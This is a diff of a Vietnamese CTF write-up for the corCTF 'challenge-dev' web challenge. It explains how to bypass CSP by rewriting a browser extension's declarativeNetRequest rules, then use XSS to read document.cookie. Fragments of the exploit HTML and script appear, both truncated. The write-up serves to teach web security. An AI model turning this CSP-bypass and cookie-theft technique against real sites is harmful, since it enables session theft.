@@ -21,56 +21,56 @@ Status: Done
 ## Summary
 
 <Callout type="note" title="Note">
-💡
+💡 Bypass CSP by overwriting extension rules via `declarativeNetRequest`.
 
 </Callout>
 
 ## Description
 
-1. `npx @puppeteer/browsers install chrome@stable`
+1. Install Chrome:
 
-   Install Chrome with
+   `npx @puppeteer/browsers install chrome@stable`
 
-2. `~/chrome/linux-127.0.6533.72/chrome-linux64/chrome --disable-extensions-except=./extension/ --load=extension=./extension/`
+2. Start Chrome with the extension:
 
-   Start Chrome like this
+   `~/chrome/linux-127.0.6533.72/chrome-linux64/chrome --disable-extensions-except=./extension/ --load=extension=./extension/`
 
-3. `rm -rf ~/.config/google-chrome-for-testing/`
+3. Reset the environment:
 
-   Reset the environment with
+   `rm -rf ~/.config/google-chrome-for-testing/`
 
-   Test voi bot local
+   Test với bot local:
 
    ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled.png)
 
 ## Analyst
 
-- Dễ nhìn thấy đoạn code vuln xss. Tuy nhiên phần csp rất khó để bypass
-- Ý tưởng khá lạ của bài này là khi bot visit url sẽ load lên extension đc setup ở manifest
-- File manifest như sau
+- Dễ nhìn thấy đoạn code vuln XSS. Tuy nhiên phần CSP rất khó để bypass.
+- Ý tưởng khá lạ của bài này là khi bot visit URL sẽ load extension được setup ở manifest.
+- File manifest như sau:
 
 ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-1.png)
 
-- Có tổng cộng 3 file js, trong đó ta sẽ tập trung phân tích 2 file
-- Đầu tiên file form_handler.js:
+- Có tổng cộng 3 file JS, trong đó ta sẽ tập trung phân tích 2 file.
+- Đầu tiên là file `form_handler.js`:
 
 ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-2.png)
 
-- Hiểu qua thì file này sẽ tạo ra 1 thẻ div sau đó insert vào document.body
-- Điều hay ở đây là trong thẻ div có 1 thẻ button khi thẻ này đc click thì nó sẽ lấy các thuộc tính trong thẻ “block-options” thực hiện serialize và merge với base_rule. Mà base_rule là rule extension được set trong local.storage.
-- File thứ 2 là file req_handler.js
+- Hiểu qua thì file này sẽ tạo ra 1 thẻ `div` sau đó insert vào `document.body`.
+- Điều hay ở đây là trong thẻ `div` có 1 thẻ `button`. Khi thẻ này được click thì nó sẽ lấy các thuộc tính trong thẻ `block-options`, thực hiện serialize và merge với `base_rule`. Mà `base_rule` là rule extension được set trong `localStorage`.
+- File thứ 2 là `req_handler.js`:
 
 ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-3.png)
 
-- Hiểu qua file này thì mỗi khi 1 tabs đc load mới thì sẽ registerRules() và sau đó sẽ set rule vào declarativeNetRequest.
-- Đối với declarativeNetRequest thì có 1 thược tính type là modifyHeaders có thể sử dụng để tắt đc csp,… Từ đó có thể thực hiện đc XSS. https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
-- Từ đó ý tưởng của ta là ta sẽ viết một server mà ở đó sẽ thêm các thẻ input vào thẻ div vào thẻ #condition. Sau đó ta sẽ thực hiện click button để [local.storage](http://local.storage) sẽ set lại các rule, tắt đi csp. Từ đó ta load lại web và thực hiện xss đọc document.cookie
+- Hiểu qua file này thì mỗi khi 1 tab được load mới thì sẽ `registerRules()` và sau đó sẽ set rule vào `declarativeNetRequest`.
+- Đối với `declarativeNetRequest` thì có 1 thuộc tính `type` là `modifyHeaders` có thể sử dụng để tắt CSP,… Từ đó có thể thực hiện được XSS. https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
+- Ý tưởng: viết một server để thêm các thẻ `input` vào thẻ `div` trong `#condition`. Sau đó click button để `localStorage` set lại các rule, tắt CSP. Từ đó load lại web và thực hiện XSS đọc `document.cookie`.
 
 ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-4.png)
 
 ## Exploit
 
-```python
+```html
 <script>
         const w = window.open("/")
         w.onload = () => {
@@ -79,8 +79,7 @@ Status: Done
 </script>
 ```
 
-```python
-
+```html
 <iframe src="http://localhost:8080/challenge/0333fd79ac4e"></iframe>
 <script>
   const sleep = (s) => new Promise((r) => setTimeout(r, s))
